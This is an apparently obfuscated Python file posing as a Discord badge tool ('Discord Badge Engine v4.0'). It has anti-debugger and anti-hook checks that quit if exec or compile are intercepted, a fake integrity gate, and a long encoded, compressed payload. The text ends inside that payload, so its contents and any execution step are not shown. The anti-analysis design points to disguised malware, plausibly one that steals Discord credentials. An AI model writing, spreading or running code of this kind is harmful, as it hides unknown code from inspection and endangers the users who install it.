# -*- coding: utf-8 -*-
# ==============================================================================
#  ███╗   ███╗   ██████╗   ███╗   ███╗   ██████╗ 
#  ████╗ ████║  ██╔═████╗  ████╗ ████║  ██╔═══██╗
#  ██╔████╔██║  ██║██╔██║  ██╔████╔██║  ██║   ██║
#  ██║╚██╔╝██║  ████╔╝██║  ██║╚██╔╝██║  ██║▄▄ ██║
#  ██║ ╚═╝ ██║  ╚██████╔╝  ██║ ╚═╝ ██║  ╚██████╔╝
#  ╚═╝     ╚═╝   ╚═════╝   ╚═╝     ╚═╝   ╚══▀▀═╝ 
# ==============================================================================
#  DISCORD BADGE ENGINE v4.0 · OFFICIAL PROTECTED RELEASE
#  ENCRYPTED & COMPILED BY m9mq SECURITY CORE (C) 2026 m9mq
#  ALL RIGHTS RESERVED · PROPRIETARY TELEMETRY SUITE
#  UNAUTHORIZED MODIFICATION, DEOBFUSCATION OR REBRANDING WILL CRASH EXECUTION
# ==============================================================================

import sys as _0x01
import base64 as _0x02
import zlib as _0x03
import hashlib as _0x04
import hmac as _0x05

_AUTHOR = "m9mq"
_SIG = "16daf459dfd692f765fc55023c280b8716d7251fe3cf00fac2cbdf4b312ab53c"
_SALT = "m9mq_hyper_shield_crypto_2026_x86_arm_v4"

def _0x_shield():
    # Anti-Debugger & Anti-Tracer
    if getattr(_0x01, "gettrace", lambda: None)() is not None:
        _0x01.exit(0)
    # Anti-Hook Verification on core execution primitives
    _b = getattr(__builtins__, "__dict__", __builtins__)
    for _fn in ("compile", "exec"):
        _f = _b.get(_fn) if isinstance(_b, dict) else getattr(_b, _fn, None)
        if _f is not None and getattr(_f, "__class__", None).__name__ != "builtin_function_or_method":
            _0x01.exit(0)

_0x_shield()

_0x_raw_key = _0x04.sha512((_AUTHOR + _SALT).encode("utf-8")).digest()
if _0x05.new(_0x_raw_key, _AUTHOR.encode("utf-8"), _0x04.sha256).hexdigest() != _SIG:
    print("\n  \x1b[38;2;239;68;68m[FATAL] Integrity verification failed. Unauthorized tampering detected.\x1b[0m\n")
    _0x01.exit(1)

_0x_payload = (
    "c-jFJGwaOa^nUQg7nyHoTT0{Z*^E$oMo!;EsO#oF^>0h>##DLv<V3`sT~d5Gi<CEurl^&pK{0T^bTD0WFqm)m7f5pTj+"
    "&19+N$)iNdXbkjG4?8xZp;+7lKEe0<Y|pqIm&-brDeudd&f5M*VAR&l#y9j1(HUmWl&|mjSkpgN7d}esc3U%s9w$Wz4e"
    "+Y?$mdNa~zZy{)aaY;9n;PH^~@gALpUwFml>a*oDPp%X?NWTiy+bDd}XQ3CVJ8(CIPV1FS3UBmqxb7y7#53`vqiOgTWa"
    "Fj;Uow)V{%HN|Zkiirpi=RA`Y*86e!qPoAWCfTR1@*3d9f)p8SA1$;Lpr=_Af%wb#WLsZY9jhlwp34hBpj)^WKPhp&eN"
    "A@fHQ!I!Q%K2>fm5O6v|IPM7#6HND#5Hkc1oqLuypDd=N*o;)0+O6&2Qv>xA@Rz0r`8a?byZL++x9+{)$-5R3b(TiCj#"
    "O$PZTy5V7_oWqKSk=nDc4vmI(FZan2ZBOV!e`QZ4mnHNaUx4NF$e6Likc~M5y0oBugu@c%jpuU>7NZ965514r;R<b~qe"
    "RA_#mb;ISSL7tebNL@OfS!x8cca+nNNu4NxCtxumF*bH8-#w0&kk=!~w96JPD;xfj6}P{cKO_`0X<pz+_Zmu!Dd6cgr9"
    "~#Qae!d6!-n!>?o0NOR8@1MD{)wS$P`t#2dM#Ai+ZS*E-N6H*NNAC(Qj+GQ}3d!o*fI$;k_$sHFqs|B~!mk7U-zuM>cp"
    "?B$?!oP+`%QX>|c5wSI*MY*|Ae3yVQxd0!Y7sjQP+V_c`=lHYJsZwB-QW6T!}uh}iMOL2$eqv!HUNMnDDj47L7rjP=h!"
    "SRVie?`r`$0W0W>w%s`vukC3Fq@3r9|{KdDG(M8zHl7?iX_@z+P_mzCX<C`mnzl>5kyTf&I0lDhlpQu1)*pAMzoHA}eN"
    "#=#YH8$BA)!VH%QvuF9JLyY}64*4+v&3-;vW}w)4G72%7+7NM2f?m_UpH39zyfx#*lvkY8=XXQ^VW<>pBdd;6{2iX$ZQ"
    "^g-ho@qq<+v6gI{@i-plDbjq6rAcd@*hEJXf0-fpTZg_4#e=;^mP}N*<bxD*Gq{U^qzKL^i*2tGmi^wB7m<v5})C@rEc"
    "6Y|xN59Emu%S6`k^>P(W-E^}#etGEF*HUgcK>)EL?b5YlT>*K=^>U}i|`o{*a{5&q5#@OEkbV;3feSqGL<qT#^Opcev5"
    "!L7P;;}17hiiYG*(vN;6f*!I%@-0(Yryo49CUzVY@sR^e<_NSg`LH1$JP&Vwrx!1b4nz+;hd?>w!F6kSmgsG{f%~QRe7"
    "oY4>0!XkNLWnLoIwR{u!WM)l{Lu=8MLW*lU}FX@W8Rn5ohgS|%rrz;RrX3_fp7<~<U+TBV3TeQew5I7s6yrTsZ#^tyPQ"
    "Y4=K_=u4^L!V1ggem-Hh7ki~2e&UI6{bh(;0L(*Ia^HW=xX8U=4?ubz#E`joBGAn^p8&rulTD=IQ(Xi?H~`WwQZz>>?g"
    "&WsJB03B!>L1x{|(+h8+JIIqIert8p~ShCtj@B3s{DrH9q*~b?Gs4>f6|Rxcw8|k`nwOH>fS&_I#Mzqmf}pMV5G3AFDZ"
    "RJrHHL@uD>tE<j6j31OL4Ogry^E@!{LXGKLc`At>q1I0zdFqA$YQ;GNe)Y)Y;GiLsu51W~hCUX9z?lPG+I+_m(S=SF1x"
    "3+|pkkfq)-xuOf^JQFtbhbF}S!eSY)+%@P%~(}hjbi@AdaUO(8$95=M!}BGv_w{<L>DW`={bU@hwY%OCW~y1Wn{zhVm{"
    "#!hv=V<Qc2J1y$*7v^8k5eKW?A11sHXUqgeY?I%0{$WnEl$peO5Fg)0R=cHZ)5Sh@2p2?Pi1`KpzAZiLo<-<?lok6oDQ"
    "FspkhgN0p{DPB}CchBYsIwJReLW9WAQtH|!-QuK+q_u@YxW(TvqZ?QYFXjvpm*7q+ZFWZ`#r<YKO9xc%(>zmvl~dU}<}"
    "f!lF11QsPr!&;KBt~IwafXeM!uxvM=lwyq;RcaCVbx%b7Z{fw#$#^3WSe}s)lE&NRR(q;0_rXF4VaZW57VPLU;sUMNj="
    "z0oTO`TqUXePfM)2ZaO~5)lB*!epm<Ka$uZySqJYxVyPbSAL7CJqJZsfZFGcy@+#DoGQkSmKMLwLhdM2gyg3<yf>s=bv"
    "iQFyw+LOvIqIrx7a&E?Qou>|_#a1vkdMK4mXH&(N}kpf7_9logy5r)!4s$$Sf(VY$bD3hX0SO7OBrb!k|v?3z$EA!hAx"
    "wj14mC%`=p|6-=?%$qw!Eaguro@1Kr#(=ver#H+PMYz~R1%=yiudP1OyptEW5+-O&v3>ra=qZ!??_k6ql=eKXaWtZ>)Q"
    "$1UGhPJ_B3ZMQq;lXL#0GDa7O^i{~-&5jNDvEQn9+49h&yJ9k@Rcr7e)<n1Rl@{6)2!B8@+-IToUiak3d<slD7FfV%{g"
    ">%d+FFdU+Ki}%s_$dD0eKdB3TzCG7PB3$lAHKHFsI<9<2D7pkG2W?f&~)++M%5uB`rq_8&u6a%B&omm8>L&Ji7KRJ<2e"
    ")m7IDwY}=o!+;qJ@Kp-ecvH;8Tb;SsyV6|Pe6Us87c2MRi;FTI)naRBLd$}Xp+*{3^lg1$ll5>7JsNfkCB%SR<6Sqv8?"
    "u$2{MUy6_zXpk38e7LJ`1Ua;YNBc<Dir$d;V}CZI01g>@NyRhL)iJhmz1iHqQ|VNpZJHfZ;wE?XY$3KNKtQf>uEP8vlN"
    "mwrz$dUAujY)WabfvcZP&U^xNWY`cyS=yHTr|Qyik|0eN@i{+!Eqpf{B5u4Nmso&hb41X1lrIe0Srnr%>w(uJfw(MuzK"
    "{!#ziqn}-D3Ds{oDn6e<V0ZZXUoM?{TCmv*I<EVhtV~r!Bn#Xk*e0j*Xdo!fLN(|dpLL2a$I5N+r+5K>h^E5gO<?5~Do"
    "{^r{9R;26oqu*k{BMXA=9=zplvdz9h-(+KM&zBwXp*Z7ni;J`+i>Sz5nALe4|w(eQ&(R5O#g<v)N{c=EGV5&mmKzi|?b"
    "$PY3Pp(YlJRBf6sO9{N)&L}Szeq4o6pqxTYKV~X5@Wxv_=X00D&X72o?EgV&j4btbz61qPUrjy16`C1jDp<)ftZrto5V"
    "2uMVrEs2|0UTqrkzeE{d%w@8PqwfCq|!yiwS?xXR35be1{Fb6MNg0^X@*H=s31FByiW9{D7`quK{0v^Qh46%t~}B+Jq@"
    "-%>%7RO1xY1fjqz`{)vg*K7Cq%^!SzAJ5+~GWW*%NV9Sa<8orm)H!-rHf2|Kz&E7dy`$-is`{tt7dFuf+>0n403!gqth"
    "&k(osKOTslbs4E;$i0~XbUN~@xXnBWc}Nlz6m@1+dkgT<DL}7m06L$D5}+m=Jqy53i$lcgTFa|gnp%kY8Kgk*^*(akm;"
    "z$_jQD!^o@+7hUJnhbt^F605rRcy7}`L8f2=>KH8HzObl`G=MdqR9DFA^7jJYmRj8(DeCU1bJK~7@}x;+7%mEzCTZ{m;"
    "S&*-k&WR%j;=gbJ3KzBzp{v$CFb{fWDhURamrI}Y2K3qEyskVInH$0IU+i7lD*sRw*B9Kj-(mcu#soKj(J(<-?l=RS>k"
    "+nCr0>Knh=@pqqWS}=)B(s%TGrNpwoa;enyvqaw_t*o_d5cX7Y%+&17rc2ewABP~%*1r~4O~?OH+lw>{QF_yzC#1pDUV"
    "ULUkt<Yw%y12j_|U0(H7M|9b~N`B!FPzYg!nFvJriIw8mnXn^ly^<rY{Z#F9TmN{?1qcE3UXVO!uyMt4xGN@~h45L!4F"
    "mfj6jl^R(^C}ahV-Bn)uK6)ENx5Tf~Zc>6E%+(AVfRIb{fZgSLp<^#CyOE61bG<DerkH_O<QQw2aQ75fEgG$Wpq8~a<?"
    "|tfGV05G#PIQv7qpC`t*PybScS|_z@b>WZmPFsBNh8ot<BJ2AJ088OSMi|k{6Q5Q`LT-Hg7{%z`nc>cxmCrFry>Btr3-"
    "!+l`G9Ur$+c_;-=WQanq}PGcAx4n>6fTj;^z=E|+U{iDKm#3}Gk`~LRq{iPm@Mak|x;i4;9R(^)Jb@;pE`FWgrEdFpas"
    "Tz`eA?`G_Wfq`ShaZ~PbZH;sLIo^Jg1vOL@d_62HBi2IhEN!>fMLxQf~^)$KL{emb=Ff7G}KZW^zQQ{c9tI^I|bP{$R="
    "CX!nd#&1@fg8cm|wE7Xw<B4C9_hdEFxq5b|n_SMV&J>-l8RV9!vN7v-B5loPgVV90<ETz0okT+G}w82jy!@Rn36oNIOT"
    "ee~tIT;#+deyKCd3&h-1-K&Ass~8)*gEt!h@*-~ogf^Yj8tNFJ1(V^YG*Z~9Cthm}0B`B%N2$~VWU8H(aEJ!Ka?7%?`}"
    "<;lnQdG5#INNTGWROkC`5f(2(9|6yPIN-D&T8hZKwW;WtvfI*+b!Sw*`jBBpWSHYVakWn0MIOQeYVDa@Cc(!dBMo4}HB"
    "QiKp@+RTzzfOt7+5Aync#j~N5k5dg>b%C`!BBv9^u!2RRUVP-E>xU>WzJ0gY-KF4Bx_yJmBZ5h~x)_vUqgsoYb?wE}RL"
    "<d(*LXYLWnr{nii-vQd-%<Rz+s|0*bgZEqp4m-l9}_yw9i}#>p?kPnMY5!ARsNR57{k^~LbVGISGeHG&<+t~71(ffd80"
    "Itdkqzd$2NN<K1>p-xgf?Z4sz*6jxLvShaFZ9-=V}}Mglb*mLGXOg?3<J05OSv^($AWYdXJ0$Se_s7Ic14v4vbq#WcID"
    "YV1QhTUizjJ_+(+aFUAvJj7|R*6i$sbTD4*e@h7wYz0`l=#q#%j7!t#ik}rp4vmUBXk`$$(p0$|Lo(=UIlVi$iVnCH2("
    "o~VD(0CiSCn?$AQ`p-F~`9tc2XzYY+{P??_Em-%jTKh`ph-BzJQ_c&xWC7ZS^C>FoVFZxOneh4fhe^TAEJQ>nophB`4I"
    "sCeFJ&=&4S?XTMTTm43y6NujqVP2&q3gg=1&ktzPSXzyz>)zDd+q(_SiW>$mxUE;{Q7AGfGH&a+l&M~BoeG^kwn~;)hG"
    "TvK46CAqfQ(qflK3h%3x{vmT0|b?JpYe#95tQmVBx+r^SMKY~svGTHxuE-7E&h=>hwtJg>j1hvf!CO$rHl*9V|6kTc>w"
    "YyF9=DaGl?ACT>!onAVxF_6eL;1WG%g5nVuoK1rAu^fU7AkjvYy*p$V(TAhy8{$mbjm1HFJYF!@l1xEk_(d<<VNjxLC2"
    "(-EJ~sUYPQiDhEHcl(}w(9#QIYN=Sh56eEWxTxQf&l`wBQxisPxXu3%c!v4pUSRKK($u3AqDDWN*e>znyTu)hr|uoX)w"
    "Zath!b3c2W!xG+j`#-@9C9PNZ|7?fu=LWQ=cu!w{&Fwul2FT|Cub$)Spq7aXf@~%v&Wdzv*Sxd~rF-kIy>NqoQtPw%zA"
    "WQ!<;;+ni?UzX6EQY%eT2yJIW?Uf(SK9aiaMN#oHyNrK~7SwRY6mkW|UH4)?Ccm7m*Bs~*I7xWP`Uo_Jj&fp>PCI`qg6"
    ">Bnsbp&}Q{{$ylKB!5ii=a$4JSO$OI6txrN3p)-SEMtplwVtU=wNP#+72_<K57J({Vmv9c>nfw@*}cdyxdnY7IjS!V_N"
    "wXS&YM(^b4>NOVQ7A7v3RPU52!;4afr5uR*FzF(I#kh`am#a!?Le&khHgBlFzj9(p>mviDS7#rxBS1!Vv0!;Bvb!<zU>"
    "x|xxXX0I(#$El>piJDy$4rh<}eyWhG3I_SxT!ZOZ=+A5F1J9^2c@q$V<_Lo*0jGZ&bb4g_%jlo!KJXKx9;v{tmRz%TSv"
    "JqYE@>^CSPN03ie+dZAl#;U>o`N)DWg{Zlu6W>oAJnjyr7n%F8u_h>akMJYNy(XsAdm6v3dk}EL&Z>_-w2YW(|#oSGLs"
    "?JGzQOS+%r@^uQ4CN;%?WO~6jkRm!Q^m0Pz?v??*H=?=Fy@6+z7S@uv(3L!a(PooyXaZ7C>q@bytrU{My&l)kGpx<ek)"
    "xAw)8CwF#K}Re|tP^LK?NiA!WTx3=fs9GRoj6Fr3XRi>5V+H8>M_NZ8?AVde;xMHJn(YsW0G1ROGTt5^HI~vBdUohe3%"
    "l1&BCP%r($e&RLmj<DJemw-fRLz$h;|5IDiq#rym852F<V>Sv<$wK}R1+`H0R%qlTxqe>Lr&u?kNvdlN$R9l99X-@wXI"
    ">s`_YLCxH5VT)$xmed%NpnUeY&now*yX1u9X3HY-i(-s<$-ykHEriY$VJa8IYcAH3btHCPh)<-JqnY&)K;g6*%Ou(c7$"
    "@DoIFc4^>)Hs{x6Rl=tZuro{A3hcN*2A$cA?QGyYdGSTF>>xgdwc1`XoSdD&#t6-7bOav*Ol08!OHqRt&rcQUP@RVSKv"
    "n4j<x&`ShSJ%Vq&xJa1&Xa&(yJhdah>C|mgsQ_{G3{(H@tkOv!{iFdeXHxugWz}V{eq2H_et%@opxXAhtpZgVCF$tPUo"
    ";9U5x&+RYA*>E;c6u9%*GPSD@%`u*+|8N7wM*gUV{i@bg|`dc)(t$!^5Ec4!_+WmRk=)w6=VBLp(TB{brBf+B>zkvK_R"
    "|5Xb4k~72~9Hzq-Dy#4mG3Ap>g`_(Z;T<`}}F)6vv9i$klu_CdCx*=DB4nq`Xp@2Dfd?mxt3m>+Z``m^Aj(PdBr85h+n"
    "N@v(#$rrW;O5yu6K7_h=gl>2*AF7o{$)#~dZA!*QV}joiSXwas&eF}73VVA*VL7DBRpP;U-}K3Jao`Ev{r&`bpFWvXB3"
    "uLmU^uQoIgfD79<ztd*oRzzn19aHFUP;Ofgho@;9g|0+zDu*en+X44QnjWm3Lha`ktJ>)PD@vF{{gIa-B6Zzd+Fl#L^$"
    ";v_u(!;EvS=iO%tgd;xXuVKy0ho&Vec1YvCb*mL>O0u&*BBP<PtXOq3>)2lrHzqi-3vo|D#togm%C8h`6PuPh6%pYb^^"
    "{=vxilj}U*QvLhMf5HHt}dX*BKERw8wChpuCvra3BE!*Hy;K<ii+2qMWWDNBB+v!-1BLmXFnX~Br=RI&f4=SzMXl;R5-"
    "o);$bNjJE+$pES?#S8Pxc*DJy2^f$K!Zw!&AwH%01ppKn%?sL~iuL?sC+(I(<}*ZS;YrND(WuCDDt&|Dkr$VlGhU}^Bd"
    "K<@36$5;q7odyqz>xTz#8O!f735sX=1hdu&)*W!(X@VwOJ=Yugk?h%!v8Y16Uav(hA4$zqqW&q(e*^{*9XI!QxEphLY*"
    "2CQ56lNtUh&(ga~>2x3>KvJoQ!SD0eXZLfFxm=bLeeV`U8qE{^w)uvg?iaeo^fmClPYHUFKatuuB&0jf69-7?_~f)yCX"
    "}3M0|V+y#meOOda-$|0zoKN+<<mxu2krpok_VOSu5Xn=j;oi@i$Q~KLZH+lXW2OUHJw-9xPDG0hW)W$ZS#Du;;FI$%Hk"
    "0$hgslHJm_3S&#Y5fAJJlr;n?D%zRz(}U~I=1X_k<4Rfb*M$*(gp?VU~aVwbUiKEp#Daqa<-QnLWApU>3U~YuiGfvvA+"
    "tZ{O}<^aT=*H$rQg{)7+rZTlXENb=V-8oF8&roX>si3TI|3ranOmheJ2lwQB8-+Bt}3+I6r7f$q|H9(I!^nvy01Z4QyH"
    "EI`ajBnwOHAe?T2b97LZyo*KZvYmO?+>Koh_G@YHK>$$41g|O{K~h-$KrsUawXk*tj?Dtf(8@Bi9Yww2ZmO)Wo#lXx88"
    "aT}nE|WC`_6K4RRxOJF1^7YTqYBXX^GjCTl@`2<SJ*Q=P%eau^hhakwbqHU|SS&)Yz_Pz(SZF-#<KSi7c}_4w*jXN}-7"
    "sVd9p9?lVuTm?Y{==_NjTV4mZ`>mNaH%QitefE-?a%@2U$n!%eO*pF+l#Z~SYNUq3M$f!lCSW%u!Sv)8I^+tpsCk8zS%"
    "f35l`F_MMyfVuuMj}nn(Bs)#;>oSFdu6_XfJSMQ?@?7(k&QVN4fOUj^cT-=$WmJ4oZs)2SFMWj)%QM(z*vg1W5`J!7JU"
    "k$g`$nWb>hB|i7PsD8p@#cVEDg4+NX#YxmG<;P;dd%CD~7~p{8JAg`^(mE_dzBb8Bj_W#W#lLxk(wkFNXHlo)eK)u;`e"
    "hN6mko))~p;jC)Tx|fkHF6q#Ynz~0{OT@c0+67_DR-Ei%s>F0`YJ?D^@`qt|&E;A3B6dDI?E#jfrb{A|;YLXBTN?D8it"
    "-L=<`Ux&i=bQttQE%8pDgu#80;dbM~5cM>osZog*c8;PGNhvbWY74sw#c>IF}zR9EL!VY|&eG#bXC(?IX*Bz`HHD@I`V"
    "Q^oU`db2S=PH{W@=$41Cw9uauR;7Qr7YNr>xdO~qPxpfd^ClXdv!mWd7I!lG7jZ;?ZR3&OO;1wX$NXHpYSr+!)&r0W93"
    "HFjwy1h!BE-=YA<f`&aixZ7<iF!qHTJ|s0px;%6-=GKbMzzhCis#wi9~FRJxNYFuFR`@pO~R*&i?&6YP}*NxT5Ru@di;"
    "{dcp5JNiwp+#@!Ay-dTdXDGkoy(1|ZL%!|dStihh3vzfo=y6U3r`C%2$VUI98cyG%9F$Q4EV;4G0NA8gLAoiZe(R7fzn"
    "+SN*gpBb9la6|EMU?b5As2v@lftt}^P7URkR!_yAi*&97VrgcKo7TMNG|F<fFjGC~k*5T$I~#Fyp2L}+?ya6L-nucY8q"
    "gB){+tW}MLh*&szy8LoUlA~)#!8f0u8jm;&^MuoZ(R&;(Q!j?|%3rM)C;q{pEcSUHgjD0in9OkYIX}ev#|H=<p#c`6lj"
    "dFy*tED*kGcA*a4(!yz0AgEc32^t1>j?Yp$T-je0+bmK#=2Z^7cB$~x3ens|(Mp)SaEKzLNK1xNdX#q`?c`1Rm^$_sZ;"
    "@Khk)(STe&gs4C!Y5T*%?NN`CRQAyq2ih!K+&d3hPU5@riYGcuqytVjKaj?!uHZWa}VsYOOfSJ5ey@1Va)Qi{j?wP&O^"
    "kNWd~m%SW|mBlYVS50Ay;zy9Ubmcl!CKRV`PDM!6-^O0a)sUEfbR+6-)bOSEVRm3%}*!6J=?<343vyj_P{eKXzNqiFea"
    "JmO^B8IJyBJ`p8DW}S*))fxp&V)bCL*3h@ui-bXTnj0}Nb9tC)_qRr?VaBfMUrxkcfI_Q4!2YKV8_XEKIzFIR3SC_=8-"
    "o;?vtsz#2XGh;KhB2zTn|Z*KMn1XUyev&$j@GW$6>MR$Lyf$j)!NHAx%Nuz>ao<VDH1P4JFQ&%gyEAa>8bz&Z-mqQ&<{"
    "wJ^65WBan(0%mRFEWT13PjcTK6y;eUgvdgYx!wq4=_6am+8KeTeFZO397!MjXjp<vwMB1bK(5ZbM)cG>N@d#sfKE2Jd!"
    "jioUMrrA5{BW;)k|Ie8z%hkxIcNZ&ohIStllT<EH88{T{L4N&y5k=DU1tre@Fg<DFg!LQimN31Yu#co<{a{+#awv#EM;"
    "+0ITdgI6{eMn=QK~%x8#J6XPj-vsQhU%9s_i{)hH6pZ(#~02m|Dg7*#7pL%M6Zj5qNZO|)FD(8WutO*^*3VQe_Dt0CQ#"
    "JtkybRuNRx6daDtJ!At2vtTxw_ul@ezZFVsexeik!+fJ`#ywo0iIOp{YBpz+Y3n3o=cpN7O5Cy&5H$9<5?}^aLaGnld3"
    "<g}u#TPdc)T>eqD532*hMZ`6g)xEwp0dvC=MGWD>;PZ^_Ctj%<oiv+SQN^uIIJ)3c%ZtX6txYwy=It$<VgFSrepw3m;J"
    "UmB8aLF~cZV*&Cg@ylnQ-x7Nge>)IcHSq}u#@eP~|vS%RwtfNbzNoay2YAZ>Do}pl!GAeuV8;pw^IaT`ni+<HHdvWvE^"
    "Il41Qb7sgwc?i5^F?TdFr8jZ@Q;yz(rgah`9rnnuW5vae!GA%bzasEH35(S3%Gke7xIG`!lG5DIAr=^tP6y8^i=pJ*Fu"
    "JsR8^zCivAtXMrYf{H}@SrNMkgYXq=^DN3A86b<Dtl3lFyWps|o~L!M>%Zzs*l4*u&Iqy&OyDNS2)fFDTLV90XCk@^$$"
    "Y@3}-R!WTW-sZCo3B4x45mie(J@}R2t#r2BRL=Glx^z%>#?=XCq2}GRZF%Dl1!?g>k$>7v^M~Y|92NG~=(;JPp%Pj5Xu"
    "Qa%sejDW9-e|Ej(a#$NR>Uwv#Vd0ex_D$;N?*4vBXrU7EZ}{?jg~G1Of+9zK12i!v%W0VceYcKI0LRRH}s~%c&?0aFa5"
    "{rp)CGXc>41lYsQVl@$!fCpF`tjF0obqk&{ZM#`<459=Xqzuz~$>ho!|F1;5t>+4H|=odx-Is0oTDFx@BN3SUvhMS01A"
    "A`6q<Wbn(L%J^L_+Rk;0_<`}nIA%6yrc4ifq0*xWKn9uy{>?7p31lTJIGl>`!mj$3?QB9J;ov|a5vV|qth9)dOqd-w4%"
    "r`)dfvRIEE_ukavx(LxFFNK{WJ7#C~zZ09Y!CviVVQpIF%fGgqd-@8Wgy0XoxVjN-8YfJuYrrCCN`SQ`hLJ1JT__s0f?"
    "RuQ@?n1ZN~m}hryCfrlSEv{CfNYmW^oC{j`nNe8go=>0Q0TMV9jtavZ1TG7+#nz7!-C9?k*RLwAf$Bjh4C<ZCnvE~`p3"
    "dK^c^W)cPx~_&<TTs|s~^8XL@z#Ag#@`}BnOT|n5AxgMCVf4YnVC%e@cl8i7_pxr~t_5JA5oZ;JdV!_(%i%05m%iKQ>|"
    "dNP8go?`Bg8$U(*6WxY1fF~0<g@*YWE(7-q$=VgX(x5bqV@EIjiLEFs#>_b1zmy$}y4Q#~f4@dWhZ9p7m&@6+F!<z(@C"
    "{?Jd<kUbxjMtX|x~2cTq>Jp5;~GeGG)?Yp<MPl?y?pp|O#XX1sD1yY>vc%6^=b~!oXa1$;}tnsW}qX+6mlF?U{f|RG-5"
    "&oVAx8mH(JZ*#v|9tNNgpo*H1UF><`j)fPR=KLUc~c%PZE(vprP6%qvplyY2}Ho_v)$gUi(HIE(7Wob_k?0=%H=_U8E+"
    "xMV9mBB~@Bdcri@txt#OPkazy=t(iqIcA4B-c>tu(WFt~c=!3CCm%QGBmuO8rMyvJPL-?pHTn%y{vAm>P_ahLL2miB?3"
    "~~zRh;w~8lvF6;C2w~zoRSl#q!NDN<}(P9`9z=NHOIka=Tv4HN0P>!SnDRO6cMmY0TsBJ=IsExV{5&(0&-+@ymNLG2`h"
    "wIcz?^Tn*gwS+87xv92&y1e$FHv{Rhv!(^{E;5FZ!oqC!{Zz5Jgl^#(Z7cj}p0v$lYB;g``F)9_#Ff^3)&4ikbaW#MtP"
    "g@CJw2G(@t)5`1Xg^&Kfm3nGH!>(C^shBVg0NZYR-mtiVzWAtIZ;-%`HL<qeIL<%DzY(oJPik#=BE%?p8S}@B`&a@%G~"
    "+Y?N0xnpBRz!!8}z4xnM!<=_aDaff5U#pW@zhcbIQTV7Oy^0M(rY$1auk7!}NzCDCR+G10hmW7`mNgY+8uPX0rVo7-{N"
    "we;aEk^%50_AT~T46Y=?D7Hg6wU%{MX+5lS9EZL65xR7#h&1n&ia9}Y#rU8|WLD_Uq=d{ma9JTK<w{Oti`tZa-_g73jI"
    "$eHn=7^QQz+a4sco9`#Xs(N*8k=IEugJyhAUKG!yh(g#-hKiuv$4n{q6|yceQZb8gD^3dq*`s;7W*9ms8zt{@r_J;?6X"
    "W5f<%%H(THj71MNJ4hOv;eaveP6}*K1GW+RAqeQYZ#{OtpzgZiCxS&Fc<AYvG4E!I}X=(6;Her0iLGVOVh-;1TX=dl+o"
    "g0tZJ}f2(O@rnNrAF$>8Ers@7}x_4ZyDFQ6JP?Omd5(tRo$n_cF|udLMoS!bTaK=ZIu{AcmVPdmu0YD;-mPp)<DpzDW}"
    "qRZIJaPlBY#URrCr?0XwzLQ1!X~K3epS*syk10%ha{#5Rw@fa*zN^8gPEqM;8m1|nvPfbooP7BsFTO`A_pSAzH9-e0?N"
    "&iy}Sr&6Pj2Grk>Vp38(w3Zm8Kw$>HGm5h}EiuJx{R-{N;Kf3&*N=tTB&F(Lmn#uB$m4>xf{{nnI&HgP9n{kAjxkB2%U"
    "s?xXy_c>wdK|oNH#4;{@BLB!k$X#xl-EiFI{;VOQ>=M%M8Qi>S{SV$8cBR#^+^FC<NnnEU_=KBtpyHThxONul0<QcGXw"
    "32GPMLDQQ-U?a4UqT`sB0as2|(a$Zg1Sj{B}#<_bH4>3x%LKP;whD{N3DbPPAb_E#7Q*D^{+vX^ZM(Q~~Q>^<Uh{a{y$"
    "X>e7=E4h^ux(w8Z~JWLFC8DIwlga_&O4z^Ov?@Z@e>vjQq}n25%>A7)E(Lg2{zzh&Qj7O^P8Fmo;<rr7HWQ{a_yBTHJ_"
    "-9VE3%z{OuLp`W;x~`x)q~TaC4&z6HAvaT_JMnMh=H4%Y(!l-X+6x~um*O}-_?tI~-LP(9l_h5j-blgm(#Wm#?-IFD+y"
    "%BCey3;0OK4E^?7uLT*ir2`H1{gAErdi>fj<__}3@j`J&P8Dy=<%-z_GRbE=mhf>SXJrX0juB(X5P`r~aL!?;al~8#xr"
    "eWy!pEgTsVu381u@_(_Tdck@FhR`Vsq*&O}pG}a@_eZSbE*1h$yRBbIMn>b5L-IucjVRWs%^oyVS4FkP8^~i}?cn<N?B"
    "yiZ>Xk_Sw)b5+n#W7LF8;2T$d-m~b2#V2D>ho>d7h?}>@Qg)yjk0PT9pid=n*YQH=0|5KH!_*17|yWVnsCal(R;Tk|bQ"
    "Qf5+w>8sSMty1Y#$zJ9UgS2rqgC-q_6}s-ou|Kzp5U0uzQuI5&kfOlxE;Vq<De<PomxEp++NH;s&B9$n}8+!w9#V$i7W"
    "36YOjO}SAI_n2;ZqeSG0;oQwO*3fenuWzi-c{mZC4C$gpcmnRs7y5`|YWe~vp7FRdMmct=sl^F8@9TOwKaz{J!CXXag="
    "k{O!pNIY{W(RNJZG9~pPtra*c&cI?%Zw&ae8@Oac{}m6@wKL|<FW!`(CRqGGXlV9ym?cHr(LD+qsWWdtIC#hctX{EGV2"
    "`%2h4>z=zJ5peYs$c=gqgY-Buug`Hagu|=y7y|-j`|@wZf|&KwabiOP>Q<mv)^I33P?X2wocKjW%n!CNm7QmJ=dq*z>l"
    "Re`q(UZb8JwbNM{01+>FgWC&J^hc9oq_Wh-<vDBI`E=Gcu8pZr004%(s<|-Yh)^wmzVPMQ5(T2Xba4;Ey%b?!7nj5B#o"
    "tKhu1U4A&%I)WffTt}e`^k4xc!A-C)n`7Yv`5;iB8E|SsxZ5pFj22E3Ahk%2TG62;7_1kL3{Q>^%U@MitEjb?Vb9d-wP"
    "|eINgRO1Za=!xGCU9VrrY3vo_|PH1H3L|6r4UXGA&rO}Vwm-_$pPRuet&3wY1r?Hp5_ALi_*)Ap`Z$?EmU(A#H=(OwZM"
    "L<vXBkv!w1OKkd{9dWL*GH;j`ZEv!2Zm3I4-V@z`Ta9OFArE?<Z!@%J>T`MnFxfSbUlWG{n>S1+A<}70Nu4cjkQ>czbS"
    "(ABObw+*Vz?(dJfgpn7SQEJPPBHbvk5_++gZRSaRD0aRxn-{<mGF=#NnNpPS=9z#Z_BU&j_~2zy=Ae^a;K!q4R&o38qt"
    "qxZZ!G=Q0V1I(_Gxc4}eeJwiCPS;86}wt*+{{zDy!;BGH&rwPFU1m1m|y>pjhXNc4zV10;O&U0cUW*Hj7`CBj;eGZr>U"
    "k<Jmb4J;F*ZqTd`IZ>j#E>v1YXk-7vFFNivElqYYp#U)BYCwN4BaWhgHJ07qJDe#i=SiYu&e?^Qu-*?5&d{--`THlksG"
    "3^=*UFGT*rZN*Wd|khcsR*UdZk_f0_Mq3pPZf^X>`_Pt6!ONTD+OU;=S0F4fdp!ch!P?$cdq$VqgF!A>fGQib~HkS=Yk"
